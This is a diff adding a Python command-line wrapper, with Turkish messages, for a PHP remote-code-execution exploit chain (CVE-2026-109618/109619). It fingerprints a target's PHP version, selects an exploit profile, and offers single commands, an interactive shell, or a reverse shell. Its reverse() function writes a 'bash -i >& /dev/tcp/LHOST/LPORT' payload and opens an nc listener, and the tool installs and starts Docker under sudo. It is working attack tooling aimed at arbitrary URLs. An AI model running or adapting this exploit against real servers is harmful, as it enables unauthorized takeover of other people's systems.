@@ -1,0 +1,338 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+php2shell - tek komut.
+
+  php2shell -u https://hedef           # hedefi otomatik tan, profile sec, exploit et
+  php2shell -u ... --shell             # interaktif komut dongusu
+  php2shell -u ... --rev --lhost IP    # reverse shell
+  php2shell -u ... --check             # sadece surum/acik kontrolu (somuru yok)
+
+Docker gerekirse kendisi kurar/baslatir.
+"""
+import argparse
+import json
+import os
+import re
+import subprocess
+import sys
+import time
+import urllib.request
+import urllib.error
+
+KIT = os.path.dirname(os.path.realpath(__file__))
+
+
+def find_repo():
+    """toolkit dizinini bul: env, yanindaki ./toolkit, kardes dizin, ev dizini."""
+    import glob
+    env = os.environ.get("PHP2SHELL_REPO")
+    if env:
+        env = os.path.abspath(env)
+        return env if os.path.isdir(os.path.join(env, "tools")) else None
+    candidates = [
+        env,
+        KIT,                              # gomulu toolkit
+        os.path.join(KIT, "toolkit"),
+        os.path.join(KIT, "..", "php2shell"),
+        os.path.expanduser("~/php2shell"),
+        os.path.expanduser("~/Desktop/php2shell/toolkit"),
+        os.path.expanduser("~/Desktop/php2shell-kit/toolkit"),
+    ]
+    candidates += sorted(glob.glob(os.path.expanduser("~/*/php2shell/tools/..")))
+    for c in candidates:
+        if not c:
+            continue
+        c = os.path.abspath(c)
+        if os.path.isdir(os.path.join(c, "tools")):
+            return c
+    return None
+REPO = find_repo()
+def profiles_dir():
+    return os.path.join(REPO, "profiles") if REPO else None
+PY = sys.executable or "python3"
+
+
+def c(txt, code=""):
+    if not sys.stdout.isatty() or os.environ.get("NO_COLOR"):
+        return txt
+    colors = {"g": "\033[32m", "r": "\033[31m", "y": "\033[33m", "b": "\033[36m", "d": "\033[90m"}
+    return colors.get(code, "") + txt + ("\033[0m" if code else "")
+
+
+def run(cmd, check=False, capture=False):
+    if capture:
+        return subprocess.run(cmd, capture_output=True, text=True)
+    return subprocess.run(cmd)
+
+
+def sudo(cmd, check=False):
+    return subprocess.call(["sudo"] + cmd)
+
+
+def have_docker():
+    import shutil
+    p = shutil.which("docker")
+    if not p or not os.access(p, os.X_OK):
+        return False
+    try:
+        return subprocess.call([p, "--version"], stdout=subprocess.DEVNULL,
+                               stderr=subprocess.DEVNULL) == 0
+    except OSError:
+        return False
+
+
+def daemon_up():
+    return subprocess.call(["sudo", "-n", "docker", "info"], stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL) == 0
+
+
+def ensure_docker(auto_install=True):
+    if not have_docker():
+        if not auto_install:
+            sys.exit(c("[!] docker yok. Kur: sudo apt install -y docker.io docker-cli", "r"))
+        print(c("[*] docker kuruluyor...", "b"))
+        env = dict(os.environ, DEBIAN_FRONTEND="noninteractive")
+        with open(os.devnull, "rb") as devnull:
+            subprocess.call(["sudo", "env", "DEBIAN_FRONTEND=noninteractive", "apt-get",
+                             "install", "-y", "--no-install-recommends", "docker.io", "docker-cli"],
+                            stdin=devnull, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if not have_docker():
+            sys.exit(c("[!] docker kurulamadi", "r"))
+    if not daemon_up():
+        print(c("[*] docker daemon baslatiliyor...", "b"))
+        subprocess.call(["sudo", "service", "docker", "start"],
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if not daemon_up():
+            subprocess.call(["sudo", "sh", "-c",
+                             "nohup dockerd --iptables=false >/tmp/dockerd.log 2>&1 &"],
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        for _ in range(15):
+            if daemon_up():
+                break
+            time.sleep(1)
+        if not daemon_up():
+            sys.exit(c("[!] docker daemon baslatilamadi (/tmp/dockerd.log)", "r"))
+
+
+def detect_php_version(url):
+    req = urllib.request.Request(url, headers={"User-Agent": "php2shell/1.0"})
+    try:
+        with urllib.request.urlopen(req, timeout=12) as r:
+            headers = r.headers
+    except Exception:
+        return None
+    for h in ("X-Powered-By", "Server"):
+        v = headers.get(h, "")
+        m = re.search(r"PHP/(\d+\.\d+\.\d+)", v, re.I)
+        if m:
+            return m.group(1)
+    return None
+
+
+def available_profiles():
+    out = []
+    pd = profiles_dir()
+    if not pd or not os.path.isdir(pd):
+        return out
+    if True:
+        for f in sorted(os.listdir(pd)):
+            if not f.endswith(".json"):
+                continue
+            try:
+                d = json.load(open(os.path.join(pd, f)))
+            except Exception:
+                continue
+            if not d.get("rce", False):
+                continue
+            ver = str(d.get("php_version") or d.get("version") or "")
+            arch = str(d.get("arch") or d.get("architecture") or "")
+            name = d.get("name") or f[:-5]
+            out.append((ver, arch, name))
+    return out
+
+
+def pick_profile(version, arch="amd64"):
+    profs = available_profiles()
+    for ver, a, name in profs:
+        if ver == version and (not a or a == arch):
+            return name
+    return None
+
+
+def auto_args(target, args):
+    cmd = ["sudo", PY, os.path.join(REPO, "tools", "php2shell_auto.py"), "-u", target]
+    if args.profile:
+        cmd += ["--profile", args.profile]
+    else:
+        ver = args.php_version or detect_php_version(target)
+        if not ver:
+            sys.exit(c("[!] PHP surumu tespit edilemedi. --php-version 8.4.26 ver "
+                       "veya --profile kullan.", "r"))
+        prof = pick_profile(ver, args.arch)
+        if not prof:
+            sys.exit(c(f"[!] {ver} ({args.arch}) icin dogrulanmis RCE profili yok.\n"
+                       f"    - mod_php/109618: --profile ... veya --php-version\n"
+                       f"    - FPM/109619    : --assess (somuru yapmaz)", "r"))
+        print(c(f"[*] tespit: PHP {ver} / {args.arch} -> profil {prof}", "g"))
+        cmd += ["--profile", prof]
+    if args.command:
+        cmd += ["-c", args.command]
+    if args.script:
+        cmd += ["--script", args.script]
+    if args.interactive:
+        cmd += ["--interactive"]
+    return cmd
+
+
+
+def require_repo():
+    if not REPO:
+        sys.exit(c("[!] toolkit bulunamadi.\n"
+                   "    git clone https://github.com/devploit/php2shell ~/php2shell\n"
+                   "    cd ~/php2shell && python3 tools/bootstrap_upstream.py\n"
+                   "    veya PHP2SHELL_REPO=/yol/php2shell", "r"))
+    return REPO
+
+
+def doctor():
+    import shutil
+    print("kit      :", KIT)
+    print("repo     :", REPO or "BULUNAMADI")
+    print("python   :", sys.version.split()[0])
+    d = shutil.which("docker")
+    print("docker   :", d or "yok")
+    if d:
+        r = subprocess.run(["sudo", "-n", "docker", "info", "--format", "{{.ServerVersion}}"],
+                           capture_output=True, text=True)
+        print("daemon   :", (r.stdout.strip() or "erisim yok (once: sudo -v)"))
+    profs = available_profiles()
+    print("profiller:", len(profs), "(hepsi mod_php / 109618)")
+    up = os.path.join(REPO, "vendor", "php2shell-upstream") if REPO else None
+    if up and os.path.isdir(up):
+        print("upstream : hazir")
+    else:
+        print("upstream : eksik -> php2shell --setup")
+    return 0
+
+
+def main():
+    ap = argparse.ArgumentParser(
+        prog="php2shell",
+        description="PHP2Shell (CVE-2026-109618/109619) - tek komut",
+        epilog="ornek: php2shell -u https://hedef --shell | --check | --assess")
+    ap.add_argument("-u", "--url", help="hedef URL")
+    ap.add_argument("--check", action="store_true", help="sadece surum/acik kontrolu (somuru yok)")
+    ap.add_argument("--doctor", action="store_true", help="ortam tanilama")
+    ap.add_argument("--setup", action="store_true", help="upstream exploiti indir (tek seferlik)")
+    ap.add_argument("--assess", action="store_true", help="FPM/109619 dahil somuru yapmayan degerlendirme")
+    ap.add_argument("--shell", dest="interactive", action="store_true", help="interaktif komut dongusu")
+    ap.add_argument("--rev", action="store_true", help="reverse shell")
+    ap.add_argument("--lhost", help="reverse shell dinleyici IP")
+    ap.add_argument("--lport", default="4444", help="reverse shell portu")
+    ap.add_argument("-c", "--command", help="tek komut")
+    ap.add_argument("--script", help="sahnelenecek script")
+    ap.add_argument("--profile", help="profil adi (otomatik secimi atlar)")
+    ap.add_argument("--php-version", help="hedef PHP surumu (otomatik tespit basarisizsa)")
+    ap.add_argument("--arch", default="amd64", choices=["amd64", "aarch64"])
+    a = ap.parse_args()
+
+    if a.setup:
+        require_repo()
+        script = os.path.join(REPO, "tools", "bootstrap_upstream.py")
+        if not os.path.exists(script):
+            sys.exit(c("[!] bootstrap_upstream.py bulunamadi", "r"))
+        print(c("[*] upstream exploit indiriliyor (9bie/php2shell-bypass-aslr-exp)...", "b"))
+        rc = subprocess.call([PY, script])
+        if rc == 0:
+            print(c("[+] hazir", "g"))
+        return rc
+
+    if a.doctor:
+        return doctor()
+
+    if not a.url:
+        ap.print_help()
+        return 2
+
+    if a.assess:
+        require_repo()
+        if not a.url:
+            sys.exit(c("[!] --assess icin -u URL gerekli", "r"))
+        host = re.sub(r"^https?://", "", a.url).split("/")[0]
+        try:
+            import socket as _s
+            _s.create_connection((host.split(":")[0], int(host.split(":")[1]) if ":" in host else 80), timeout=5).close()
+        except Exception as e:
+            sys.exit(c(f"[!] hedefe ulasilamadi: {host} ({type(e).__name__})", "r"))
+        cmd = [PY, os.path.join(REPO, "tools", "php2shell_assess.py"), "--target", a.url]
+        if not re.match(r"https?://(127\.|localhost)", a.url):
+            cmd.append("--allow-remote")
+        return subprocess.call(cmd)
+
+    if a.check:
+        v = detect_php_version(a.url)
+        if not v:
+            print(c("[?] surum basligi yok - savunmasiz oldugu anlamina gelmez", "y"))
+            return 1
+        fixed = {"8.2": "8.2.35", "8.3": "8.3.36", "8.4": "8.4.27", "8.5": "8.5.12"}
+        branch = ".".join(v.split(".")[:2])
+        f = fixed.get(branch)
+        vuln = f and [int(x) for x in v.split(".")] < [int(x) for x in f.split(".")]
+        durum = c("SAVUNMASIZ", "r") if vuln else c("yamali", "g")
+        print(f"[*] PHP {v} ({branch}) -> {durum}")
+        print(f"    CVE-2026-109618 + CVE-2026-109619  (duzeltme: {f})")
+        return 0 if not vuln else 1
+
+    require_repo()
+    up = os.path.join(REPO, "vendor", "php2shell-upstream")
+    if not os.path.isdir(up):
+        sys.exit(c("[!] upstream exploit eksik.\n"
+                   "    php2shell --setup   (tek seferlik indirir)", "r"))
+    ensure_docker()
+    if a.rev:
+        if not a.lhost:
+            sys.exit(c("[!] --lhost gerekli", "r"))
+        return reverse(a)
+
+    cmd = auto_args(a.url, a)
+    if a.interactive:
+        cmd.append("--interactive")
+    return subprocess.call(cmd)
+
+
+def reverse(a):
+    url = a.url
+    tmp = "/tmp/php2shell-rev"
+    os.makedirs(tmp, exist_ok=True)
+    fifo, out, script = f"{tmp}/in", f"{tmp}/out", f"{tmp}/rs.sh"
+    for p in (fifo, out):
+        if os.path.exists(p):
+            os.unlink(p)
+    os.mkfifo(fifo)
+    listener = subprocess.Popen(["nc", "-lvnp", a.lport],
+                                stdin=open(fifo, "rb"), stdout=open(out, "wb"),
+                                stderr=subprocess.STDOUT)
+    time.sleep(1)
+    with open(script, "w") as f:
+        f.write(f'exec bash -c "bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1"\n')
+    print(c(f"[*] dinleyici :{a.lport} (cikti: {out})", "b"))
+    base = auto_args(url, a)
+    subprocess.call(base + ["--script", script])
+    print(c("[*] shell bekleniyor...", "b"))
+    time.sleep(6)
+    try:
+        with open(out, "rb") as f:
+            data = f.read().decode("utf-8", "replace")
+        print(data[-2000:] if data else c("[!] baglanti yok", "y"))
+    finally:
+        listener.terminate()
+    return 0
+
+
+if __name__ == "__main__":
+    try:
+        sys.exit(main())
+    except KeyboardInterrupt:
+        sys.exit(130)
+
